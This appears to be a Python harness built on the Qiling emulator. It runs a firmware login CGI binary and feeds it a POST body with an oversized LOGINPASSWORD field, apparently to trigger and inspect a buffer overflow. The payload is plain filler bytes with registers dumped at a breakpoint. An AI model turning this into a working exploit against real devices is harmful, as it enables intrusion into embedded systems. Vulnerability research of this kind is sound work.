from qiling import *

# hook function for syscall sysinfo
def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
    ql.mem.write(sysinfo_info, b"AAAA") # uptime
    regreturn = 0
    ql.log.info(f"sysinfo(0x{sysinfo_info:02x}) = {regreturn}")
    return regreturn

# dump all registers
def dump_reg(ql, *args, **kwargs):
    ql.log.info("="*0x10 + " register dump " + "="*0x10)
    for idx, val in ql.reg.save().items():
        if not isinstance(idx, int):
            ql.log.info(f"{idx}: {hex(val)}")
            
    breakpoint()

# fake stdin for sending payload
class Fake_stdin:
    def read(self, size, *args, **kwargs):
        return b'ACTION=login&LOGINPASSWORD=' + b'A' * 0x248

    def fileno(self, *args, **kwargs):
        return 0

if __name__ == "__main__":

    envs = {
            "REQUEST_METHOD": "POST",
            "REQUEST_URI": "/MTFWU",
            "CONTENT_TYPE": "application/x-www-form-urlencoded",
            "HTTP_MTFWU_ACT": "Login",
            "HTTP_COOKIE": "uid=AAAA",
            "CONTENT_LENGTH": str(27+0x248), 
            }

    ql = Qiling(["squashfs-root/usr/sbin/mtfwu"], "squashfs-root", 
                output="default",
                env=envs,           # setting environment variables 
                stdin=Fake_stdin()) # hijack stdin with Fake_stdin
                
    ql.set_syscall("sysinfo", my_syscall_sysinfo)  # syscall hook for sysinfo
    ql.set_syscall("_newselect", lambda *_: None)  # hook syscall _newselect with anonymous NOP function to avoid manual input requirement
    ql.hook_address(dump_reg, 0x41d3f0)            # breakpoint before return and dump all registers

    with open("squashfs-root/var/session/c1", "wb+") as fh: # setup propper session file
        fh.write(b"AAAA\x00" + b"A"*0xbf)                   # first four bytes were the UID in cookie

    ql.run()

